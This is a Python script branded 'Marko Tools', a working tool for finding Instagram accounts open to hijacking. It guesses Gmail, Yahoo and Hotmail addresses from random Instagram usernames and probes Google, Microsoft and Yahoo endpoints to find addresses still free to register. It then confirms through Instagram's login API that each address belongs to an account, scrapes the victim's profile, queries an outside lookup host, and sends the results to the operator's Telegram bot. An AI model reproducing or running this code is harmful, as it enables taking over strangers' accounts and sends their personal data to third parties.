import os , json , random , time
import requests,telebot
from user_agent import generate_user_agent
from uuid import uuid4
from cfonts import render

E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح


class main:
    def __init__(self):
        self.true = 0
        self.false = 0
        self.gmail = 0
        self.ungmail = 0
        self.yahoo = 0
        self.unyahoo = 0
        self.hotmail = 0
        self.unhotmail = 0
        self.ch = 0
        self.token = str(input("[+] Enter token the  bot : "))
        time.sleep(random.randint(1,2))
        self.id_telegram = str(input("[+] Enter the id telegram : "))
        time.sleep(random.randint(1,2))
        self.sessionid = str(input("[+] Enter the sessionid : "))
        time.sleep(random.randint(1,2))
        self.cooke = "sessionid={};".format(self.sessionid)
        self.clear()
        if self.ch_cookie():
            self.run()
        else:
            print("[ ! ] Error : Sessionid  Blocked")
    def clear(self):
        return os.system("clear")
    def ch_cookie(self):
        url = "https://i.instagram.com"+"/api/v1/users/"+"ali"+"/usernameinfo/"
        self.headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cookie': self.cooke,
        'origin': 'https://www.instagram.com', 
        'referer': 'https://www.instagram.com/',
        'user-agent': 'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)',
        'x-asbd-id': '437806',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2tr9ATAjFiw03wub6DICb8kMwlARf3D1PN6R1B0JGc9X4Q',}
        result = requests.get(url,headers=self.headers).json()["status"]
        if result == "ok":
            return True
        else:
            return False
    def run(self):
        self.clear()
        colors = [random.choice(['red','green','blue']),random.choice(['red','green','blue']),random.choice(['red','green','blue'])]
        while True:
            emails = self.get_email()
            for email in emails:
                self.email = email["email"]
                self.username = email["user"]["username"]
                if "@gmail.com" in self.email:
                    if self.ch_gmail():
                        self.gmail+=1
                        if self.ch_instagram():
                            self.send_true()
                            self.true+=1
                        else:
                            self.false+=1
                    else:
                        self.ungmail+=1
                if "@yahoo.com" in self.email:
                    if self.ch_yahoo():
                        self.yahoo+=1
                        if self.ch_instagram():
                            self.send_true()
                            self.true+=1
                        else:
                            self.false+=1
                    else:
                        self.unyahoo+=1
                if "@hotmail.com" in self.email:
                    if self.ch_hotmail():
                        self.hotmail+=1
                        if self.ch_instagram():
                            self.send_true()
                            self.true+=1
                        else:
                            self.false+=1
                    else:
                        self.unhotmail+=1
                self.clear()
                self.bnr = render('Marko Tools',colors=colors,align='center');print(self.bnr+"\n"*1)
                print(f"{E}[{G}+{E}] {G}True {A}: {G}{self.true}\t"+f"{E} False {A}: {E}{self.false}")
                print(f"{E}[{S}+{E}] {S}Gmail {A}: {G}{self.gmail}\t{E}False {A}: {E}{self.ungmail}")
                print(f"{E}[{S}+{E}] {S}Yahoo {A}: {G}{self.yahoo}\t{E}False {A}: {E}{self.unyahoo}")
                print(f"{E}[{S}+{E}] {S}Hotmail {A}: {G}{self.hotmail}\t{E}False {A}: {E}{self.unhotmail}")
    def get_email(self):
        num = random.randint(5,8)
        name = "".join(random.choice("zxcvbnmasdfghjklqwertyuiop1234567890")for _ in range(num))
        list_email = []
        req = requests.get("https://www.instagram.com/web/search/topsearch/?context=blended&query={}".format(name),headers=self.headers).json()
        for info in req["users"]:
            username = str(info["user"]["username"])
            domens = ["@gmail.com","@hotmail.com","@yahoo.com"]
            for domen in domens:
                email = username+domen
                list_email.append({"email":email,"user":info["user"]})
        return list_email
    def ch_gmail(self):
        url = 'https://android.clients.google.com/setup/checkavail'
        headers = {
        'Content-Length':'98',
        'Content-Type':'text/plain; charset=UTF-8',
        'Host':'android.clients.google.com',
        'Connection':'Keep-Alive',
        'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
        data = json.dumps({
        'username':self.email,
        'version':'3',
        'firstName':'Marko',
        'lastName':'Tools'})
        res = requests.post(url,data=data,headers=headers)
        if res.json()['status'] == 'SUCCESS':
            return True
        else:
            return False
    def ch_hotmail(self):
        headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': str(generate_user_agent()),
        'Connection': 'close',
        'Host': 'odc.officeapps.live.com',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'canary': 'BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c',
        'uaid': str(uuid4()),
        'Cookie': 'xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354'}
        response = requests.request("POST", "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(self.email) + "&_=1604288577990", data=False, headers=headers)
        if str('Neither') in str(response.text):
            return True
        else:
            return False
    def ch_yahoo(self):
        eml = self.email.replace('@yahoo.com','')
        headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Length': '17973',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
        'Host': 'login.yahoo.com',
        'Origin': 'https://login.yahoo.com',
        'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
        'Sec-Ch-Ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': str(generate_user_agent()),
        'X-Requested-With': 'XMLHttpRequest'}
        data = {
        'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
        'specId': 'yidreg',
        'crumb': 'rak/FdAmWa5',
        'acrumb': '9z9sgq95',
        'done': 'https://www.yahoo.com',
        'attrSetIndex': '0',
        'tos0': 'oath_freereg|xa|ar-JO',
        'yid': str(eml),
        'password': 'https://t.me/SidraTools',
        'shortCountryCode': 'AF',}
        response = requests.request("POST", 'https://login.yahoo.com/account/module/create?validateField=yid', data=data, headers=headers)
        if str('"birthDate"') in str(response.text):
            return True
        else:
            return False
    def ch_instagram(self):
        url='https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
        data = {
              'uuid':uuid4(),
              'password':'@MarkoTools',
              'username':self.email,
              'device_id':uuid4(),
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data).json()
        if req['message'] == 'The password you entered is incorrect. Please try again.':
            return True
        else:
            return False
    def get_info(self):
        url = "https://i.instagram.com"+"/api/v1/users/"+self.username+"/usernameinfo/"
        self.headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cookie': self.cooke,
        'origin': 'https://www.instagram.com', 
        'referer': 'https://www.instagram.com/',
        'user-agent': 'Instagram 27.0.0.7.97 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)',
        'x-asbd-id': '437806',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR2tr9ATAjFiw03wub6DICb8kMwlARf3D1PN6R1B0JGc9X4Q',}
        result = requests.get(url,headers=self.headers).json()
        return result
    def send_true(self):
        info = self.get_info()["user"]
        id = info["pk"]
        name = info["full_name"]
        username = info["username"]
        fs = info["follower_count"]
        fg = info["following_count"]
        post = info["media_count"]
        profile_pic_url = info["profile_pic_url"]
        bio = info["biography"]
        data = str(requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["data"])
        text = f"""
𖤚  𝐌𝐀𝐑𝐊𝐎-𝐓𝐎𝐎𝐋𝐒 ࿐ 🇮🇶.  
.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
  𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : {username}
  𝐞𝐦𝐚𝐢𝐥 : {self.email}
  𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {fs}
  𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {fg}
  𝐩𝐨𝐬𝐭 : {post}
  𝐝𝐚𝐭𝐚 : {data}
︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
  𝐂𝐡 : @Marko_Tools ☆ @QQQQQQ2
"""
        bot = telebot.TeleBot(token=self.token)
        bot.send_photo(chat_id=self.id_telegram,photo=profile_pic_url,caption=text)
main()


